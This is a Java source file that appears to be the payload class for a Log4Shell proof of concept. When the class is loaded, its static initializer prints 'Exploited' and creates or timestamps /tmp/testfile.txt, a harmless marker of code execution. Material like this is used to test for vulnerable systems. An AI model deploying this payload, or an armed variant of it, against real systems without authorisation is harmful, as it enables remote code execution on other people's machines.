import java.io.BufferedWriter;
import java.io.File;  // Import the File class
import java.io.FileWriter;
import java.io.IOException;  // Import the IOException class to handle errors
import java.sql.Timestamp;


public class log4jpoc {
    public log4jpoc() {}
    static {
        try {
            System.out.println("Exploited");
            File myObj = new File("/tmp/testfile.txt");
            Timestamp timestamp = new Timestamp(System.currentTimeMillis());
            if (myObj.createNewFile()) {
              System.out.println("File created: " + myObj.getName());
              
            } else {
              System.out.println("File already exists, writing timestamp to it");
              BufferedWriter out = new BufferedWriter(
                      new FileWriter("/tmp/testfile.txt", true));
              
              out.write(timestamp+"\n");
              out.newLine();
              out.close();
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {
        log4jpoc e = new log4jpoc();
    }
}